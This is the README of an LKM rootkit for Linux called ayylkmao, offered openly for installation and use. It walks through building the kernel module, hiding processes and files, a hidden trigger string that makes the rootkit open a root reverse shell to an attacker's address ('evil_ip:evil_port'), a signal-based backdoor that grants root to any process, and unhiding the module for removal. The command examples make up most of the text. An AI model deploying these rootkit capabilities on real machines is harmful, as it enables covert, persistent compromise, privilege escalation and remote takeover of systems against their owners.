# ayylkmao.ko
An LKM rootkit for aliens by aliens.

## Installation
Make sure you have the kernel headers installed for your target system. After that you can just run:

```
git clone https://github.com/ableiten/ayylkmao && cd ayylkmao
make
```

That's all. You can install the `ayylkmao.ko` module normally.

## Basic Usage
The magic kill signals are all defined as macros in [ayylkmao.c](https://github.com/ableiten/ayylkmao/blob/master/ayylkmao.c#L11). It is recommended that you modify these.

#### Hiding Processes
You can hide processes using the signals `SIGNAL_HIDE_PROCESS` and `SIGNAL_SHOW_PROCESS`.

```
> pidof python
18237
> kill -50 18237
> pidof python
> kill -51 18237
> pidof python
18237
```
#### Hiding Files/Directories
You can hide files and directories by naming them using the `MAGIC_PREFIX` prefix.

```
> touch sp00kyfile file
> ls
file
```

#### Phoning Home
To phone home you will need a reverse shell that accepts arguments [like this one](https://github.com/ableiten/simple-reverse-shell). The tool should be saved on the infected system as `MAGIC_PREFIX-util/rev` where the rootkit knows to look for it.

After that you can simply send specially formatted data over any connection and a root reverse shell will phone home to the specified address and port.

Using the default backdoor magic, that would look something like this:
```
3tph0n3h0m3{evil_ip:evil_port}
```

#### Privilege Escalation Backdoor
You can give any process root by sending it the `SIGNAL_GIVE_ROOT` signal.

```
> whoami                                 
user
> echo $$                                
6678
> kill -52 6678                          
> whoami                                 
root
```

#### Removal
Since the kernel module is hidden and thus unremovable by default, you will need to unhid before it can be removed. To do this simply signal any process with `SIGNAL_UNHIDE_MODULE` and then you should be able to remove the module normally.

```
> kill -53 0
> rmmod ayylkmao.ko
```

## Useful Material
- [Every](https://github.com/jiayy/lkm-rootkit) [single](https://github.com/croemheld/lkm-rootkit) [other](https://github.com/m0nad/Diamorphine) [LKM](https://github.com/triedal/rootkit) [rootkit](https://github.com/nurupo/rootkit/) (Each word is a seperate link)
- http://phrack.org/issues/58/7.html
- http://www.ouah.org/LKM_HACKING.html (mirror, original unavailable as of writing)
- http://r00tkit.me/
